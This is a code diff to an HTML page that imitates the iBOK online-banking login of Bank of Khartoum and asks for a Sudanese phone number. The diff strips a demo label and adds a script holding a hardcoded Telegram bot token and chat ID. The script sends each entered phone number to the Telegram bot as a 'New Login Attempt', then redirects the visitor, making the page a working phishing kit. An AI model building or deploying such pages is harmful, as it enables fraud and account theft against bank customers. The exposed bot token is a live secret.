@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phone number I iBOK</title>
+    <title>Phone number | iBOK</title>
     <style>
         * {
             box-sizing: border-box;
@@ -81,18 +81,6 @@
             box-shadow: 0 13px 26px #e8cfd166;
         }
         
-        .demo-label {
-            width: fit-content;
-            margin: 0 auto 10px;
-            padding: 4px 9px;
-            border-radius: 12px;
-            background: #fff2cc;
-            color: #725000;
-            font-size: 11px;
-            font-weight: 700;
-            letter-spacing: .04em;
-        }
-        
         h1 {
             margin: 0 0 14px;
             color: #f32d32;
@@ -132,6 +120,14 @@
             font-size: 14px;
             font-weight: 700;
             white-space: nowrap;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .country-flag {
+            width: 20px;
+            height: auto;
         }
         
         input {
@@ -200,6 +196,50 @@
             width: 25px;
             height: 25px;
         }
+        /* Toast notification style */
+        
+        .toast {
+            visibility: hidden;
+            min-width: 250px;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 8px;
+            padding: 12px;
+            position: fixed;
+            z-index: 1000;
+            left: 50%;
+            bottom: 30px;
+            transform: translateX(-50%);
+            font-size: 14px;
+        }
+        
+        .toast.show {
+            visibility: visible;
+            animation: fadein 0.5s, fadeout 0.5s 2s;
+        }
+        
+        @keyframes fadein {
+            from {
+                bottom: 0;
+                opacity: 0;
+            }
+            to {
+                bottom: 30px;
+                opacity: 1;
+            }
+        }
+        
+        @keyframes fadeout {
+            from {
+                bottom: 30px;
+                opacity: 1;
+            }
+            to {
+                bottom: 0;
+                opacity: 0;
+            }
+        }
         
         @media (max-width: 600px) {
             header {
@@ -256,10 +296,10 @@
                     <label for="phone">Enter the phone number:</label>
                     <div class="phone-field">
                         <span class="prefix">
-                  <img src="https://flagcdn.com/w40/sd.png" alt="Sudan flag" class="country-flag">
-                  +249
-                  </span>
-                        <input id="phone" name="phone" type="tel" inputmode="numeric" placeholder="9XXXXXXXX" autocomplete="off" aria-label="Phone number">
+                            <img src="https://flagcdn.com/w40/sd.png" alt="Sudan flag" class="country-flag">
+                            +249
+                        </span>
+                        <input id="phone" name="phone" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="9XXXXXXXX" autocomplete="off" aria-label="Phone number">
                     </div>
                     <button class="submit-button" type="submit">Continue</button>
                 </form>
@@ -267,23 +307,89 @@
         </main>
 
         <footer>
-            <div>iBOK I Bank of Khartoum 2026</div>
-            <div>All rights reserved, Bank of Khartoum ,iBOK 2026</div>
+            <div>iBOK | Bank of Khartoum 2026</div>
+            <div>All rights reserved, Bank of Khartoum, iBOK 2026</div>
         </footer>
 
         <div class="contact-button" aria-label="Contact demo">
             <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
-        <path d="M20 11.7a8.2 8.2 0 0 1-12.1 7.2L4 20l1.1-3.7A8.2 8.2 0 1 1 20 11.7Z"
-          stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
-        <path d="M9 8.5c.2-.4.4-.4.7-.4h.4c.2 0 .3.1.4.4l.6 1.4c.1.2.1.4-.1.6l-.5.6c-.2.2-.1.4 0 .6.4.7 1 1.3 1.7 1.7.2.1.4.2.6 0l.6-.5c.2-.2.4-.2.6-.1l1.4.6c.3.1.4.2.4.4v.4c0 .3 0 .5-.4.7-.4.2-1.1.4-1.8.2-1-.3-2.1-.9-3.1-1.9s-1.6-2.1-1.9-3.1c-.2-.7 0-1.4.2-1.8Z"
-          fill="currentColor"/>
-      </svg>
+                <path d="M20 11.7a8.2 8.2 0 0 1-12.1 7.2L4 20l1.1-3.7A8.2 8.2 0 1 1 20 11.7Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+                <path d="M9 8.5c.2-.4.4-.4.7-.4h.4c.2 0 .3.1.4.4l.6 1.4c.1.2.1.4-.1.6l-.5.6c-.2.2-.1.4 0 .6.4.7 1 1.3 1.7 1.7.2.1.4.2.6 0l.6-.5c.2-.2.4-.2.6-.1l1.4.6c.3.1.4.2.4.4v.4c0 .3 0 .5-.4.7-.4.2-1.1.4-1.8.2-1-.3-2.1-.9-3.1-1.9s-1.6-2.1-1.9-3.1c-.2-.7 0-1.4.2-1.8Z" fill="currentColor"/>
+            </svg>
         </div>
     </div>
 
+    <!-- Toast element for feedback messages -->
+    <div id="toast" class="toast"></div>
+
     <script>
-        document.getElementById("demo-form").addEventListener("submit", function(event) {
+        // =======================
+        // BOT CONFIG
+        // =======================
+        const BOT_TOKEN = '7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc';
+        const CHAT_ID = '8406078749';
+
+        // =======================
+        // DOM REFERENCES
+        // =======================
+        const demoForm = document.getElementById("demo-form");
+        const phoneInput = document.getElementById("phone");
+        const toast = document.getElementById("toast");
+
+        // =======================
+        // INPUT SANITIZER (Numbers Only)
+        // =======================
+        phoneInput.addEventListener("input", function() {
+            // Strips out any non-digit character instantly
+            this.value = this.value.replace(/\D/g, "");
+        });
+
+        // =======================
+        // TOAST NOTIFICATION
+        // =======================
+        function showToast(message) {
+            if (!toast) return;
+            toast.textContent = message;
+            toast.classList.add("show");
+            clearTimeout(window.toastTimer);
+            window.toastTimer = setTimeout(() => toast.classList.remove("show"), 2400);
+        }
+
+        // =======================
+        // FORM SUBMISSION & TELEGRAM
+        // =======================
+        demoForm.addEventListener("submit", function(event) {
             event.preventDefault();
+
+            const phone = (phoneInput.value || '').trim();
+
+            if (!phone) {
+                showToast("Please enter the phone number.");
+                phoneInput.focus();
+                return;
+            }
+
+            localStorage.setItem('phone', phone);
+
+            const message = `New Login Attempt\n\nPhone: +249 ${phone}`;
+
+            // Send to Telegram Bot
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(() => {});
+
+            showToast("Form submitted.");
+
+            setTimeout(() => {
+                window.location.href = 'dashboard.html';
+            }, 1500);
         });
     </script>
 </body>
